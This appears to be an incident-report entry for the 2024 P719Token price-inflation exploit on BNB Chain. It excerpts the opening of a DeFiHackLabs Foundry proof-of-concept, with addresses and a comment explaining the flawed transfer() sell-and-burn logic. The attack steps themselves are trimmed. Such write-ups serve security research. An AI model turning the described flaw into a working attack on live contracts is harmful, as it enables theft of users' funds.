# [?] P719Token - Price Manipulation Inflate Attack

## Summary
Severity: Unknown
Chain: BNB Chain
Component: P719Token
Published: 2024-10-11
Source: https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2024-10/P719Token_exp.sol
Type: defi-exploit-poc

## Details
```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "../interface.sol";

// @KeyInfo - Total Lost : 547.18 BNB (~$312K USD)
// Attacker : https://bscscan.com/address/0xfeb19ae8c0448f25de43a3afcb7b29c9cef6eff6
// Attack Contract : https://bscscan.com/address/0x3f32c7cfb0a78ddea80a2384ceb4633099cbdc98
// Vulnerable Contract : https://bscscan.com/token/0x6beee2b57b064eac5f432fc19009e3e78734eabc
// Attack Tx : https://bscscan.com/tx/0x9afcac8e82180fa5b2f346ca66cf6eb343cd1da5a2cd1b5117eb7eaaebe953b3
// @Info
// Vulnerable Contract Code : https://bscscan.com/token/0x6beee2b57b064eac5f432fc19009e3e78734eabc#code
// Not verified contract but the bug lies in `transfer()` function, when tokens are transferred to P719,
// the action is processed as a sell, using a Uniswap-like swap mechanism to calculate the BNB amount to
// be swapped.
// After the swap, P719 burns the majority of sold tokens and transfers fee tokens from itself, which could
// wrongly inflates the token's price.
// More info: https://x.com/TenArmorAlert/status/1844929489823989953

// @POC Author : [rotcivegaf](https://twitter.com/rotcivegaf)

// Contracts involved
address constant PancakeRouter = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
address constant PancakeV3Pool = 0x172fcD41E0913e95784454622d1c3724f546f849;
address constant weth = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;

address constant P719 = 0x6bEee2B57b064EAC5F432FC19009E3E78734Eabc;

contract P719Token_exp is Test {
    address attacker = makeAddr("attacker");
    MyToken myToken;

    function setUp() public {
        vm.createSelectFork("bsc", 43_023_423 - 1);
    }

```

_Trimmed to 38 lines — full report: https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2024-10/P719Token_exp.sol_
